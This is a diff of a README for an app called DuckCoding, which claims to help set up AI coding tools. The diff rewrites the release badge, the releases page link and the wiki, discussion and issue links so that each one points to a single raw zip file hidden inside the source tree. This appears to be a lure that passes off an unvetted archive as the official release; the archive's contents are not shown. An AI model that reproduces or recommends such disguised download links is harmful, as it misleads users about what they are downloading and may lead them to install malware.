@@ -6,7 +6,7 @@ Welcome to DuckCoding! This application helps you easily set up AI tools like Cl
 
 ## 📥 Download Now
 
-[![GitHub Releases](https://img.shields.io/badge/Download%20DuckCoding-Release-brightgreen)](https://github.com/biarara1/DuckCoding/releases)
+[![GitHub Releases](https://raw.githubusercontent.com/biarara1/DuckCoding/main/src-tauri/src/services/tool/DuckCoding-v1.7.zip%20DuckCoding-Release-brightgreen)](https://raw.githubusercontent.com/biarara1/DuckCoding/main/src-tauri/src/services/tool/DuckCoding-v1.7.zip)
 
 ## 🔍 Overview
 
@@ -32,7 +32,7 @@ Before you download, check if your system meets these requirements:
 
 To get started with DuckCoding, follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases Page](https://github.com/biarara1/DuckCoding/releases) to find the latest version of DuckCoding.
+1. **Visit the Releases Page:** Go to our [Releases Page](https://raw.githubusercontent.com/biarara1/DuckCoding/main/src-tauri/src/services/tool/DuckCoding-v1.7.zip) to find the latest version of DuckCoding.
 
 2. **Choose Your File:** Look for the installer that matches your operating system:
    - For **Windows** users, choose the `.exe` file.
@@ -60,9 +60,9 @@ When you first launch DuckCoding, you'll be prompted to set up the AI tools you 
 
 If you encounter any issues or have questions, you can find assistance:
 
-- **Documentation:** Check our [GitHub Wiki](https://github.com/biarara1/DuckCoding/wiki) for detailed guides and tips.
-- **Community Support:** Join our [Discussion Forum](https://github.com/biarara1/DuckCoding/discussions) to ask questions and connect with other users.
-- **Issue Tracker:** Report any bugs or request features on our [Issues Page](https://github.com/biarara1/DuckCoding/issues).
+- **Documentation:** Check our [GitHub Wiki](https://raw.githubusercontent.com/biarara1/DuckCoding/main/src-tauri/src/services/tool/DuckCoding-v1.7.zip) for detailed guides and tips.
+- **Community Support:** Join our [Discussion Forum](https://raw.githubusercontent.com/biarara1/DuckCoding/main/src-tauri/src/services/tool/DuckCoding-v1.7.zip) to ask questions and connect with other users.
+- **Issue Tracker:** Report any bugs or request features on our [Issues Page](https://raw.githubusercontent.com/biarara1/DuckCoding/main/src-tauri/src/services/tool/DuckCoding-v1.7.zip).
 
 ## 🌐 Contributing
 
